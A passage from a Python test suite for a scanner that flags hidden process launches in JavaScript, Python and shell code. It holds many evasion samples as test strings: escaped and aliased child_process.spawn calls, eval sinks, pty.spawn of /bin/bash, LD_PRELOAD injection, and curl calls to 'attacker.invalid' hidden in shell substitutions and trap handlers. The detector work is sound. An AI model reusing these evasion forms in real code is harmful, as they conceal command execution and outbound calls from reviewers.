const relay = { [`r\x75n`]: load(`child_\u{70}rocess`)[`sp\x61wn`] };
relay.run(`curl`, []);''',
    )
    for source in sources:
        failures = direct_dispatch_violations(path, source)
        assert any(item.endswith(":curl") or item.startswith("ambiguous_dispatch:") for item in failures), source
    assert _canonical_javascript_static_word_escapes(r"\u0073\u{70}\x61wn") == "spawn"
    assert _canonical_javascript_static_word_escapes(r"\\u0073pawn") == r"\\u0073pawn"


def test_javascript_reassignment_provenance_is_source_ordered():
    path = ROOT / "probe.ts"
    positives = {
        "require": 'let runner = {};\nrunner = require("node:child_process");\nrunner.spawn("git", ["status"]);',
        "dynamic_import": 'let runner = {};\nrunner = await import("child_process");\nrunner.spawn("git", ["status"]);',
        "object_alias": 'let runner = {}; const cp = require("child_process");\nrunner = cp;\nrunner.execFile("git", []);',
        "member_alias": 'const cp = require("child_process"); let run = value;\nrun = cp.spawnSync;\nrun("git", []);',
        "destructuring": 'let run; ({ spawn: run } = require("child_process"));\nrun("git", []);',
        "unknown": 'let runner = {};\nrunner = obtain();\nrunner.spawn("/trusted/tool", []);',
    }
    for name, source in positives.items():
        failures = direct_dispatch_violations(path, source)
        assert failures, (name, failures)
        if name == "unknown":
            assert any(item.startswith("ambiguous_dispatch:") for item in failures), failures
    controls = (
        'let runner = require("child_process");\nrunner = {};\nrunner.spawn("git", []);',
        'let runner = require("child_process");\nrunner = class Local {};\nrunner.spawn("git", []);',
        'const cp = require("child_process"); let run = cp.spawn;\nrun = (value) => value;\nrun("git");',
    )
    for source in controls:
        assert direct_dispatch_violations(path, source) == [], source


def test_javascript_reassignment_provenance_uses_only_executable_spans():
    path = ROOT / "probe.ts"
    inert_reassignments = {
        "bare_string_statement": 'let runner = require("child_process");\n"runner = {}";',
        "semicolon_string": 'let runner = require("child_process");\nconst doc = "x; runner = {}";',
        "template_text": 'let runner = require("child_process");\nconst doc = `x; runner = {}`;',
        "regex_literal": r'let runner = require("child_process");' "\n" r'const pattern = /x; runner = {}/;',
    }
    for name, prefix in inert_reassignments.items():
        failures = direct_dispatch_violations(path, prefix + '\nrunner.spawn("git");')
        assert any(item.endswith(":git") for item in failures), (name, failures)

    fake_loaders = (
        'const runner = {};\n"runner = require(\\"child_process\\")";\nrunner.spawn("git");',
        'const runner = {};\nconst doc = `runner = require("child_process")`;\nrunner.spawn("git");',
        r'const runner = {};' "\n" r'const pattern = /runner = require\("child_process"\)/;' "\n" r'runner.spawn("git");',
    )
    for source in fake_loaders:
        assert direct_dispatch_violations(path, source) == [], source

    interpolation = 'const sample = `text ${require("child_process").spawn("git")} tail`;'
    failures = direct_dispatch_violations(path, interpolation)
    assert any(item.endswith(":git") for item in failures), failures


def test_javascript_lexical_view_ignores_inert_text_but_scans_interpolations():
    path = ROOT / "probe.ts"
    controls = (
        'const url = "https://host/x//y/*z*/"; const sample = "process.spawn(\\"git\\")";',
        r'const pattern = /child_process\.spawn\("git"\)\/\/*not-comment/gi;',
        'const sample = `child_process.spawn("git") // text ${"mystery.execFile(\\"git\\")"}`;',
        'const nested = `outer ${`inner text process.spawn("git")`} tail`;',
    )
    for source in controls:
        assert direct_dispatch_violations(path, source) == [], source
    after_text = 'const sample = "child_process.spawn(\\"git\\")";\nchild_process.spawn("git", []);'
    assert direct_dispatch_violations(path, after_text)
    interpolation = 'const sample = `text ${mystery.spawn("git", [])} tail`;'
    assert any(item.startswith("ambiguous_dispatch:") for item in direct_dispatch_violations(path, interpolation))
    regex_brace_interpolation = (
        'const sample = `${/}/.test("}") && require("child_process").spawn("curl")}`;'
    )
    assert any(
        item.endswith(":curl")
        for item in direct_dispatch_violations(path, regex_brace_interpolation)
    )
    for source in (
        'const sample = `${/[}]/.test("}") && require("child_process").spawn("curl")}`;',
        'const sample = `${value / require("child_process").spawn("curl") / 2}`;',
    ):
        assert any(item.endswith(":curl") for item in direct_dispatch_violations(path, source)), source
    inert_interpolation_regex = (
        'const sample = `${/require("child_process").spawn("curl")/.test(value)}`;'
    )
    assert direct_dispatch_violations(path, inert_interpolation_regex) == []


def test_javascript_contextual_keywords_and_properties_do_not_hide_division_dispatches():
    path = ROOT / "probe.ts"
    sources = (
        'const of = 2;\nof / require("child_process").spawn("curl") / 2;',
        'const obj = { return: 2 };\nobj.return / require("child_process").spawn("curl") / 2;',
        'const of = 2;\nfor (; of / require("child_process").spawn("curl") / 2;) break;',
        'const obj = { of: 2 };\nfor (; obj.of / require("child_process").spawn("curl") / 2;) break;',
        'const of = 2;\nfor (let x in of / require("child_process").spawn("curl") / 2) break;',
        'let a = 1;\na++ / require("child_process").spawn("curl") / 2;',
        'let a = 1;\na-- / require("child_process").spawn("curl") / 2;',
        'const cp = require("child_process");\nconst obj = { if: function(x) { return x; } };\nobj.if (1) / cp.spawn("curl"); / 1;',
    )
    for source in sources:
        failures = direct_dispatch_violations(path, source)
        assert any(item.endswith(":curl") for item in failures), failures
    genuine_regex = 'const pattern = /require("child_process").spawn("curl")/;\nconst value = 1;'
    assert direct_dispatch_violations(path, genuine_regex) == []
    safe_property_division = 'const obj = { if(x){ return x; } };\nobj.if(1) / 2 / 1;'
    assert direct_dispatch_violations(path, safe_property_division) == []
    assert _javascript_lexical_views("\n" + genuine_regex)[1].count("\n") == 2


def test_javascript_loader_forms_and_lexical_comment_blanking_fail_closed():
    path = ROOT / "probe.ts"
    positives = {
        "parenthesized_require": 'const cp = (require)("child_process"); cp.spawn("curl")',
        "sequence_require": 'const cp = (0, require)("child_process"); cp.spawn("curl")',
        "optional_require": 'const cp = require?.("child_process"); cp.spawn("curl")',
        "module_require": 'const cp = module.require("child_process"); cp.spawn("curl")',
        "global_require": 'const cp = globalThis.require("child_process"); cp.spawn("curl")',
        "process_require": 'const cp = process.mainModule.require("child_process"); cp.spawn("curl")',
        "redundant_parentheses": 'const load = (((require))); const cp = load("child_process"); cp.spawn("curl")',
        "esm_create_require": (
            'import { createRequire as factory } from "node:module"; '
            'const load = factory(import.meta.url); const again = load; '
            'const cp = again("child_process"); cp.spawn("curl")'
        ),
        "cjs_create_require": (
            'const { createRequire: factory } = require("module"); '
            'const load = factory(__filename); const cp = load("node:child_process"); cp.execFile("curl")'
        ),
        "await_import": 'const cp = await import("node:child_process"); cp.spawn("curl")',
        "require_alias": 'const load = require; const cp = load("child_process"); cp.execSync("curl")',
        "immediate_require": 'require("child_process").spawn("curl")',
        "direct_import": 'import("node:child_process").spawnSync("curl")',
        "object_alias": 'const cp = require("child_process"); const again = cp; again.spawn("curl")',
        "string_comments": 'const url = "http://host/*not-comment*/"; require("child_process").spawn("curl")',
        "template_comments": 'const url = `http://host//still-text/*x*/`;\nrequire("child_process").spawn("curl")',
        "escaped_quote": 'const value = "\\\"//not-comment"; /* real */ require("child_process").spawn("curl")',
    }
    for name, source in positives.items():
        assert direct_dispatch_violations(path, source), (name, source)
    for source in (
        'const cp = await import(moduleName); cp.spawn("/trusted/tool")',
        'require(moduleName).spawn("/trusted/tool")',
        'const cp = require("child_process"); cp[api]("/trusted/tool")',
    ):
        failures = direct_dispatch_violations(path, source)
        assert any(item.startswith("ambiguous_dispatch:") for item in failures), (source, failures)
    for source in (
        'const require = (name: string) => ({ spawn: name }); require("child_process").spawn;',
        'const fake = { spawn(value: string) { return value; } }; fake.spawn("curl");',
    ):
        assert direct_dispatch_violations(path, source) == [], source


def test_javascript_unresolved_process_receivers_fail_closed_except_proven_locals():
    path = ROOT / "probe.ts"
    for source in (
        'mystery.spawn("/trusted/tool")',
        'const receiver = obtain(); receiver.execFileSync("/trusted/tool")',
        'const cp = require(moduleName); cp.spawn("/trusted/tool")',
    ):
        failures = direct_dispatch_violations(path, source)
        assert any(item.startswith("ambiguous_dispatch:") for item in failures), (source, failures)
    controls = (
        'const fake = { spawn(value: string) { return value; } }; fake.spawn("curl");',
        'class Fake { execSync(value: string) { return value; } } const fake = new Fake(); fake.execSync("curl");',
        'const helper = (value: string) => value; helper.spawn("curl");',
    )
    for source in controls:
        assert direct_dispatch_violations(path, source) == [], source


def test_javascript_process_api_bypasses_and_shell_apis_fail_closed():
    path = ROOT / "probe.ts"
    mutations = {
        "spawn_sync_alias": 'const tool = "git"; spawnSync(tool, ["status"]);',
        "exec_sync": 'execSync("git status");',
        "exec": 'child_process.exec(command);',
        "qualified_spawn": 'child_process.spawn("custom-tool", []);',
        "qualified_exec_file": 'child_process.execFile("./tool", []);',
        "shell_true": 'spawn("/trusted/tool", [], { shell: true });',
        "namespace_import": 'import * as cp from "node:child_process"; cp.spawnSync("curl", []);',
    }
    for name, source in mutations.items():
        assert direct_dispatch_violations(path, source), (name, source)

    controls = (
        'function helper(value) { return value; } helper("git status");',
        'const diagnostic = { cmd: ["git", "status"] };',
    )
    for source in controls:
        assert not direct_dispatch_violations(path, source), source


def test_javascript_process_like_declarations_are_not_dispatch_calls():
    path = ROOT / "probe.ts"
    controls = {
        "object_method": (
            'const fake = { spawn() {} };\nconst method = "spawn";\n'
            'const launch = fake[method];\nlaunch("curl");\n'
        ),
        "class_methods": "class Fake { spawn() {} static execSync(value) { return value; } }\n",
        "named_function": "function execFile(tool: string) { return tool; }\nexecFile(\"curl\");\n",
        "local_arrows": (
            "const spawnSync = (tool: string) => tool;\nspawnSync(\"curl\");\n"
            "const exec = async tool => tool;\nexec(\"curl\");\n"
        ),
    }
    for name, source in controls.items():
        assert direct_dispatch_violations(path, source) == [], (name, source)

    positives = {
        "destructured": (
            'const { spawn } = require("node:child_process");\nspawn("curl", []);\n'
        ),
        "imported": 'import { execFileSync as launch } from "child_process";\nlaunch("curl", []);\n',
    }
    for name, source in positives.items():
        failures = direct_dispatch_violations(path, source)
        assert any(item.endswith(":curl") for item in failures), (name, failures)


def test_javascript_child_process_function_aliases_require_proven_provenance():
    path = ROOT / "probe.ts"
    mutations = {
        "destructured_require": (
            'const { spawnSync: run } = require("child_process");\n'
            'const tool = "git";\nrun(tool, ["status"]);\n'
        ),
        "member_alias": (
            'const run = child_process.spawnSync;\nconst tool = "git";\nrun(tool, ["status"]);\n'
        ),
        "required_object_member_alias": (
            'const cp = require("node:child_process");\nconst run = cp.spawnSync;\n'
            'run("git", ["status"]);\n'
        ),
        "computed_spawn": 'const cp = require("child_process"); cp["spawn"]("git", []);',
        "computed_spawn_sync": "const cp = require('child_process'); cp['spawnSync']('git', [])",
        "no_semicolon_alias_chain": (
            'const cp = require("child_process")\nconst first = cp.spawn\nconst second = first\n'
            'second("git", [])\n'
        ),
        "optional_member_alias": (
            'const cp = require("node:child_process"); const launch = cp?.spawn; '
            'launch("curl");'
        ),
        "optional_computed_alias": (
            'const cp = require("node:child_process"); const first = cp?.["spawnSync"]; '
            'const launch = first; launch("curl");'
        ),
    }
    for name, source in mutations.items():
        failures = direct_dispatch_violations(path, source)
        expected = "curl" if name.startswith("optional_") else "git"
        assert any(item.endswith(f":{expected}") for item in failures), (name, failures)

    control = 'const fake = { execSync(value: string) { return value; } }; fake.execSync("diagnostic");\n'
    assert direct_dispatch_violations(path, control) == []


def test_javascript_computed_child_process_method_aliases_resolve_or_fail_closed():
    path = ROOT / "probe.ts"
    resolved = {
        "optional_literal_binding": (
            'const cp = require("node:child_process");\nconst method = "spawn";\n'
            'const launch = cp?.[method];\nlaunch("curl");\n'
        ),
        "optional_property_alias_chain": (
            'const cp = require("child_process");\nconst method = "spawnSync";\n'
            'const selected = method;\nconst launch = cp?.[selected];\nlaunch("curl");\n'
        ),
        "computed_literal_binding": (
            'const cp = require("node:child_process");\nconst method = "spawn";\n'
            'const launch = cp[method];\nlaunch("curl");\n'
        ),
        "computed_property_alias_chain": (
            'const cp = require("child_process");\nconst method = "spawnSync";\n'
            'const selected = method;\nconst launch = cp[selected];\nlaunch("curl");\n'
        ),
    }
    for name, source in resolved.items():
        failures = direct_dispatch_violations(path, source)
        assert any(item.endswith(":curl") for item in failures), (name, failures)

    unresolved = {
        "optional": (
            'const cp = require("node:child_process");\nconst launch = cp?.[method];\n'
            'launch("/trusted/tool");\n'
        ),
        "non_optional": (
            'const cp = require("node:child_process");\nconst launch = cp[method];\n'
            'launch("/trusted/tool");\n'
        ),
    }
    for name, source in unresolved.items():
        failures = direct_dispatch_violations(path, source)
        assert any(item.startswith("ambiguous_dispatch:") for item in failures), (name, failures)

    assert direct_dispatch_violations(
        path, 'const method = "spawn";\nconst launch = fake[method];\nlaunch("curl");\n'
    ) == []


def test_javascript_proven_calls_with_unsupported_argument_shapes_fail_closed():
    path = ROOT / "probe.ts"
    mutations = {
        "template": 'child_process.spawn(`git`, []);',
        "interpolated_template": 'child_process.spawn(`${tool}`, []);',
        "spread": 'child_process.spawn(...argv);',
        "call": 'child_process.spawn(resolveTool(), []);',
        "member": 'child_process.spawn(config.tool, []);',
        "subscript": 'child_process.spawn(config[tool], []);',
        "parenthesized": 'child_process.spawn((tool), []);',
        "optional_object": 'child_process?.spawn(tool, []);',
        "optional_call": 'child_process.spawn?.(tool, []);',
        "optional_alias": 'const { spawn } = require("child_process"); spawn?.(tool, []);',
        "dynamic_property": 'const cp = require("child_process"); cp[api]("git", []);',
        "static_property": 'const cp = require("child_process"); cp["spawn"]("git", []);',
    }
    for name, source in mutations.items():
        failures = direct_dispatch_violations(path, source)
        assert failures, (name, source)
        if name not in {"template", "static_property"}:
            assert any(item.startswith("ambiguous_dispatch:") for item in failures), (name, failures)

    controls = (
        'const fake = { spawn(value: unknown) { return value; } }; fake.spawn(resolveTool(), []);',
        'class Fake { spawn(value: unknown) { return value; } } const fake = new Fake(); fake?.spawn?.(`${tool}`, []);',
        'const diagnostic = { spawn: ["git"] };',
    )
    for source in controls:
        assert not direct_dispatch_violations(path, source), source


def test_unresolved_process_options_and_bounded_launcher_calls_fail_closed():
    path = ROOT / "probe.py"
    mutations = {
        "shell": 'import subprocess\nsubprocess.Popen(["/trusted/tool"], shell=flag)\n',
        "override": 'import subprocess\nsubprocess.Popen(["/trusted/tool"], executable=tool)\n',
        "bounded_ambient": 'run_bounded(["git", "status"])\n',
        "bounded_alias": 'tool = "git"\nrun_bounded([tool, "status"])\n',
        "bounded_helper_alias": 'launch = run_bounded\nlaunch(["git", "status"])\n',
        "bounded_dynamic": 'run_bounded(argv)\n',
        "bounded_nested": 'def unsafe():\n    run_bounded(["git", "status"])\n',
        "bounded_nested_alias": 'launch = run_bounded\ndef unsafe():\n    launch(["git", "status"])\n',
        "bounded_nested_dynamic": 'def unsafe(argv):\n    run_bounded(argv)\n',
    }
    for name, source in mutations.items():
        assert direct_dispatch_violations(path, source), (name, source)

    trusted = (
        'import subprocess\n'
        'subprocess.run([str(trusted_executable_path("git")), "status"], shell=False)\n'
    )
    assert direct_dispatch_violations(path, trusted) == []


def test_parameterized_launcher_exemptions_are_bound_to_exact_provenance():
    smoke = ROOT / "scripts" / "hermes-busdriver-smoke"
    probes = {
        "reported_red": "def run_bounded(cmd):\n    subprocess.Popen(user_controlled)\n",
        "different_variable": "def run_bounded(cmd):\n    subprocess.Popen(other)\n",
        "extra_parameter": "def run_bounded(cmd, other):\n    subprocess.Popen(other)\n",
        "computed": "def run_bounded(cmd):\n    subprocess.Popen(make_cmd())\n",
        "attribute": "def run_bounded(cmd):\n    subprocess.Popen(cmd.argv)\n",
        "subscript": "def run_bounded(cmd):\n    subprocess.Popen(cmd[0])\n",
    }
    for name, source in probes.items():
        assert direct_dispatch_violations(smoke, source), (name, source)

    deliver = ROOT / "scripts" / "hermes-busdriver-deliver"
    late_rewrite = (
        "def run_safe(argv):\n"
        "    effective_argv = list(argv)\n"
        "    subprocess.Popen(effective_argv)\n"
        "    effective_argv[0] = str(trusted_executable_path(trusted_name))\n"
    )
    failures = direct_dispatch_violations(deliver, late_rewrite)
    assert any(item.startswith("ambiguous_dispatch:") for item in failures), failures

    for path in sorted(installed_sources()):
        assert not direct_dispatch_violations(path), path


def test_every_launcher_exemption_requires_its_constant_full_function_fingerprint():
    smoke = ROOT / "scripts" / "hermes-busdriver-smoke"
    spoof = ROOT / "nested" / smoke.name
    assert direct_dispatch_violations(spoof, smoke.read_text()), spoof
    source = smoke.read_text()
    function = next(node for node in ast.parse(source).body if isinstance(node, ast.FunctionDef) and node.name == "run")
    original = ast.get_source_segment(source, function)
    assert original is not None
    mutations = {
        "command_head": original.replace("run_bounded(cmd", "run_bounded(['curl']", 1),
        "data_flow": original.replace("run_bounded(cmd", "run_bounded(list(reversed(cmd))", 1),
        "executable_statement": original.replace("    try:\n", "    audit = True\n    try:\n", 1),
        "validation_moved": original.replace("if ", "if True:\n        pass\n    if ", 1),
        "alternate_dispatch": original.replace("    try:\n", "    subprocess.Popen(other)\n    try:\n", 1),
    }
    approved = APPROVED_FUNCTION_AST_SHA256[(smoke.name, "run")]
    assert hashlib.sha256(_canonical_ast_bytes(function)).hexdigest() == approved
    for name, candidate in mutations.items():
        mutated = ast.parse(candidate).body[0]
        assert hashlib.sha256(_canonical_ast_bytes(mutated)).hexdigest() != approved, name
        assert direct_dispatch_violations(smoke, candidate), name


def test_installed_run_safe_matches_exact_canonical_ast_fingerprint():
    source = (ROOT / "scripts" / "hermes-busdriver-deliver").read_text()
    function = next(
        node for node in ast.parse(source).body
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)) and node.name == "run_safe"
    )
    assert hashlib.sha256(_canonical_ast_bytes(function)).hexdigest() == RUN_SAFE_AST_SHA256
    assert _run_safe_provenance(function)


def test_run_safe_canonical_fingerprint_rejects_full_function_mutations():
    source = (ROOT / "scripts" / "hermes-busdriver-deliver").read_text()
    original = next(
        node for node in ast.parse(source).body
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)) and node.name == "run_safe"
    )
    original_source = ast.get_source_segment(source, original)
    assert original_source is not None

    rewrite = "effective_argv[0] = str(trusted_executable_path(trusted_name))"
    mutations = {
        "popen_before_rewrite": original_source.replace(rewrite, "pass", 1).replace(
            "    try:\n        if trusted_name is not None:",
            "    proc = subprocess.Popen(effective_argv)\n"
            "    try:\n        if trusted_name is not None:",
            1,
        ),
        "unreachable_rewrite": original_source.replace(
            "if trusted_name is not None:", "if False and trusted_name is not None:", 1
        ),
        "changed_call": original_source.replace("subprocess.Popen(", "subprocess.run(", 1),
        "changed_keyword": original_source.replace("shell=False", "shell=True", 1),
        "changed_control_flow": original_source.replace(
            'if trusted_name == "gh":', 'if trusted_name != "gh":', 1
        ),
        "added_statement": original_source.replace(
            "started = time.time()", "started = time.time()\n    audit_marker = True", 1
        ),
        "removed_statement": original_source.replace("    started = time.time()\n", "", 1),
    }
    original_digest = hashlib.sha256(_canonical_ast_bytes(original)).hexdigest()
    for name, mutated_source in mutations.items():
        mutated = ast.parse(mutated_source).body[0]
        digest = hashlib.sha256(_canonical_ast_bytes(mutated)).hexdigest()
        assert digest != original_digest, name
        assert not _run_safe_provenance(mutated), name


def test_canonical_ast_ignores_only_optional_empty_fields():
    baseline = ast.parse("def probe(value):\n    return call(value, mode='safe')\n").body[0]
    with_empty_list = ast.parse("def probe(value):\n    return call(value, mode='safe')\n").body[0]
    with_empty_list._fields = (*with_empty_list._fields, "future_optional")
    with_empty_list.future_optional = []
    with_empty_none = ast.parse("def probe(value):\n    return call(value, mode='safe')\n").body[0]
    with_empty_none._fields = (*with_empty_none._fields, "future_optional")
    with_empty_none.future_optional = None
    assert _canonical_ast_bytes(baseline) == _canonical_ast_bytes(with_empty_list)
    assert _canonical_ast_bytes(baseline) == _canonical_ast_bytes(with_empty_none)

    with_nonempty = ast.parse("def probe(value):\n    return call(value, mode='safe')\n").body[0]
    with_nonempty._fields = (*with_nonempty._fields, "future_optional")
    with_nonempty.future_optional = [ast.Name(id="TypeParameter", ctx=ast.Load())]
    assert _canonical_ast_bytes(baseline) != _canonical_ast_bytes(with_nonempty)


def test_javascript_unresolved_heads_fail_closed_except_exact_authenticated_broker():
    probe = ROOT / "probe.ts"
    assert direct_dispatch_violations(probe, "execFileSync(other, []);\n")
    broker = ROOT / "adapters" / "pi" / "busdriver-tools.ts"
    assert not direct_dispatch_violations(broker)
    mutated = broker.read_text().replace(
        'execFileSync(python, ["-I", script]', 'execFileSync(other, ["-I", script]', 1
    )
    assert direct_dispatch_violations(broker, mutated)


def test_python_import_aliases_are_dispatch_consumers_and_cannot_bypass_checks():
    path = ROOT / "probe.py"
    for source in (
        'import subprocess as sp\nsp.run(["git", "status"])\n',
        'from subprocess import run as launch\nlaunch(["git", "status"])\n',
    ):
        assert direct_dispatch_violations(path, source), source


def test_legacy_and_arithmetic_substitutions_are_recursively_scanned():
    path = ROOT / "scripts" / "check-required-checks.sh"
    source = path.read_text()
    mutations = {
        "legacy_assignment": "x=`curl`",
        "legacy_arguments": "x=`curl https://attacker.invalid/`",
        "legacy_escaped_nested": "x=`echo \\`curl\\``",
        "arithmetic_escaped_nested": "echo $(( `echo \\`curl\\`` + 1 ))",
        "legacy_multiply_nested_arguments": "x=`echo \\`echo \\\\\\`curl https://attacker.invalid/\\\\\\`\\``",
        "legacy_double_quote": 'x="result: `curl https://attacker.invalid/`"',
        "arithmetic_command": "echo $(( $(curl https://attacker.invalid/) ))",
        "arithmetic_legacy": "echo $(( `curl https://attacker.invalid/` + 1 ))",
        "quoted_arithmetic_command": 'echo "$(( $(curl https://attacker.invalid/) + 1 ))"',
    }
    for name, mutation in mutations.items():
        candidate = source + "\n" + mutation + "\n"
        assert shell_syntax_failure(path, candidate) is None, name
        failures = direct_dispatch_violations(path, candidate)
        assert "shell_dispatch:curl" in failures, (name, failures)
        assert "shell_dispatch:https://attacker.invalid/" not in failures, (name, failures)

    unterminated = direct_dispatch_violations(path, source + "\nx=`curl\n")
    assert any(
        item.startswith("unparsed_shell:unclosed_legacy_command_substitution:")
        for item in unterminated
    ), unterminated

    unbalanced_nested = direct_dispatch_violations(path, source + "\nx=`echo \\`curl`\n")
    assert any(item.startswith("unparsed_shell:") for item in unbalanced_nested), unbalanced_nested

    controls = (
        "echo $(( count + 1 ))",
        "echo $(( (count + 1) * (limit - 2) ))",
        "echo $(( $((count + 1)) * 2 ))",
        'echo "$(( (count + 1) * 2 ))"',
        "x=`printf %s \\\\`",
    )
    expected_existing = {"shell_dispatch:$@", *(f"shell_dispatch:{command}" for command in REQUIRED_CHECKS_SHELL_DISPATCHES)}
    for control in controls:
        candidate = source + "\n" + control + "\n"
        assert shell_syntax_failure(path, candidate) is None, control
        assert not [
            item for item in direct_dispatch_violations(path, candidate)
            if item.startswith("shell_dispatch:") and item not in (expected_existing | {"shell_dispatch:printf"})
        ], control


def test_shell_even_backslashes_before_double_quote_do_not_hide_commands():
    path = ROOT / "probe.sh"
    source = '#!/bin/bash\nprintf "%s" "foo\\\\"\ncurl https://attacker.invalid\n# "\n'
    assert shell_syntax_failure(path, source) is None
    failures = direct_dispatch_violations(path, source)
    assert "shell_dispatch:curl" in failures, failures


def test_malformed_installed_shell_is_detected_by_bash_and_scanner():
    path = ROOT / "scripts" / "check-required-checks.sh"
    source = path.read_text()
    for mutation in ('\necho "unterminated\n', "\nfi\n"):
        failures = direct_dispatch_violations(path, source + mutation)
        assert any(item.startswith("invalid_shell_syntax:") for item in failures), failures
    assert any(item.startswith("unparsed_shell:") for item in direct_dispatch_violations(path, source + '\necho "unterminated\n'))


def test_runtime_dictionaries_dynamic_code_and_callable_targets_fail_closed():
    path = ROOT / "probe.py"
    mutations = (
        'globals()["__builtins__"]["__import__"]("subprocess").run(["git"]);\n',
        'import importlib\nimportlib.__dict__["import_module"]("subprocess").Popen(["git"])\n',
        'import sys\nsys.modules["subprocess"].check_call(["git"])\n',
        'import os\nos.posix_spawn("/bin/echo", ["echo"], {})\n',
        'import os\nos.posix_spawnp("echo", ["echo"], {})\n',
        'import pty\npty.spawn("git")\n',
        'import pty\npty.spawn("/bin/bash")\n',
        'import pty\npty.spawn("/bin/sh")\n',
        'import pty\npty.spawn("/usr/bin/env")\n',
        'import pty\npty.spawn("/opt/homebrew/bin/bash")\n',
        'exec("import subprocess; subprocess.run([\'curl\'])")\n',
        'eval("__import__(\'os\').system(\'curl\')")\n',
        'import multiprocessing, os\nmultiprocessing.Process(target=os.system, args=("curl",))\n',
        'import multiprocessing\nmultiprocessing.Process(target=target, args=())\n',
        'import subprocess\nsubprocess.run(["/trusted/tool"], env={"LD_PRELOAD": value})\n',
        'def launch(module):\n    module.Popen(["curl"])\n',
        'def launch(module):\n    getattr(module, "Popen")(["curl"])\n',
        'def launch(namespace):\n    namespace.eval("__import__(\\"os\\").system(\\"curl\\")")\n',
    )
    for source in mutations:
        assert direct_dispatch_violations(path, source), source
    assert direct_dispatch_violations(
        path, 'import pty\npty.spawn(str(trusted_executable_path("bash")))\n',
    ) == []
    assert direct_dispatch_violations(path, 'note = "eval(unsafe)"\nregex = r"exec(unsafe)"\n') == []


def test_env_approval_is_fingerprint_override_and_statement_order_bound():
    deliver = ROOT / "scripts" / "hermes-busdriver-deliver"
    installed = deliver.read_text()
    changed_helper = installed.replace(
        'env["PATH"] = "/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin"',
        'env["PATH"] = "/tmp:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin"', 1,
    )
    assert any(item.endswith(":env_override") for item in direct_dispatch_violations(deliver, changed_helper))

    path = ROOT / "scripts" / "hermes-busdriver-deliver"
    probes = (
        'def safe_git_env():\n    return dict(os.environ)\nsubprocess.run([str(trusted_executable_path("git"))], env=safe_git_env())\n',
        'env = safe_git_env()\nenv = user_env\nsubprocess.run([str(trusted_executable_path("git"))], env=env)\n',
        'subprocess.run([str(trusted_executable_path("git"))], env=safe_git_env(extra))\n',
        'subprocess.run([str(trusted_executable_path("git"))], env=safe_git_env({"LD_PRELOAD": "x"}))\n',
        'subprocess.run([str(trusted_executable_path("git"))], env=safe_git_env({"DYLD_INSERT_LIBRARIES": "x"}))\n',
        'subprocess.run([str(trusted_executable_path("git"))], env=safe_git_env({"PYTHONPATH": "x"}))\n',
    )
    for source in probes:
        assert any(item.endswith(":env_override") for item in direct_dispatch_violations(path, source)), source


def test_javascript_computed_loaders_receivers_and_dynamic_code_fail_closed():
    path = ROOT / "probe.ts"
    mutations = (
        'module["require"]("child_process")["spawn"]("curl")',
        'receiver["spawn"]("/trusted/tool")',
        'receiver?.["spawnSync"]?.("/trusted/tool")',
        'eval("require(\"child_process\").spawn(\"curl\")")',
        'new Function("return process")()',
        'setTimeout("require(\"child_process\").spawn(\"curl\")", 1)',
        'vm.runInNewContext(`require("child_process").spawn("curl")`)',
        'new Worker(`data:text/javascript,postMessage(1)`)',
    )
    for source in mutations:
        assert direct_dispatch_violations(path, source), source
    controls = (
        'const text = "eval(unsafe); receiver[\\"spawn\\"]()";',
        'const text = `new Function("bad"); receiver["spawn"]() text`;',
        r'const pattern = /eval\(unsafe\)|receiver\["spawn"\]/;',
        'const fake = { other(value: string) { return value; } }; fake["other"]("curl");',
    )
    for source in controls:
        assert direct_dispatch_violations(path, source) == [], source
    assert direct_dispatch_violations(path, 'const text = `safe ${eval(code)} text`;')


def test_trap_handlers_are_recursively_scanned_or_bound_to_known_functions():
    path = ROOT / "probe.sh"
    for handler in ('trap "curl attacker" EXIT', "trap 'curl attacker' EXIT"):
        assert "shell_dispatch:curl" in direct_dispatch_violations(path, "#!/bin/bash\n" + handler + "\n")
    clean = "#!/bin/bash\ncleanup() { printf done; }\ntrap cleanup EXIT\n"
    assert direct_dispatch_violations(path, clean) == []
    ambiguous = direct_dispatch_violations(path, "#!/bin/bash\ntrap cleanup EXIT\n")
    assert any(item.startswith("unparsed_shell:") for item in ambiguous)


def test_discovery_includes_direct_failures_and_approved_launcher_env_provenance():
    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".py", prefix="dispatch-probe-", dir=ROOT / "scripts", encoding="utf-8"
    ) as probe:
        probe.write('exec("pass")\n'); probe.flush()
        assert Path(probe.name) in discovered_dispatch_consumers((Path(probe.name),))
    launcher = ROOT / "scripts" / "hermes-busdriver-deliver"
    assert not direct_dispatch_violations(launcher), "canonical launcher env provenance must remain approved"


def test_r61_javascript_lexical_wrappers_bindings_and_dynamic_sinks_close_bypasses():
    path = ROOT / "probe.ts"
    positives = (
        'function f(){ return /`/.test(x) }\nrequire("child_process").spawn("curl")',
        'function f(){ throw /`/ }\nrequire("child_process").spawn("curl")',
        'function* f(){ yield /`/ }\nrequire("child_process").spawn("curl")',
        'const kind = typeof /`/; require("child_process").spawn("curl")',
        '(require("child_process")).execSync("curl")',
        '[require("child_process")][0].execSync("curl")',
        '[require("child_process")][index].execSync("curl")',
        'let cmd = "/trusted/tool"; cmd = "curl"; require("child_process").spawn(cmd)',
        'let cmd = "curl"; cmd = obtain(); require("child_process").spawn(cmd)',
        'let cmd = "curl"; cmd += suffix; require("child_process").spawn(cmd)',
        'let cmd = "curl"; ({cmd} = obtain()); require("child_process").spawn(cmd)',
        'Function("return process")()',
        'globalThis["eval"]("bad")',
        'vm["runInNewContext"]("bad")',
        'globalThis[sink]("bad")',
        'vm[sink]("bad")',
    )
    for source in positives:
        assert direct_dispatch_violations(path, source), source
    controls = (
        'const text = "return /`/; globalThis[\\"eval\\"]()";',
        'const text = `vm["runInNewContext"]() ${"safe"}`;',
        r'const regex = /globalThis\["eval"\]|`/;',
        'const local = { eval(value: string) { return value } }; local["eval"]("safe")',
        'const vmLocal = { runInNewContext(value: string) { return value } }; vmLocal["runInNewContext"]("safe")',
    )
    for source in controls:
        assert direct_dispatch_violations(path, source) == [], source


def test_r61_python_loaders_source_order_and_dynamic_sinks_close_bypasses():
    path = ROOT / "probe.py"
    positives = (
        '__import__("pty").spawn("curl")\n',
        '__import__("multiprocessing").Process(target=__import__("os").system)\n',
        'import sys\nsys.modules.get("subprocess").Popen(["curl"])\n',
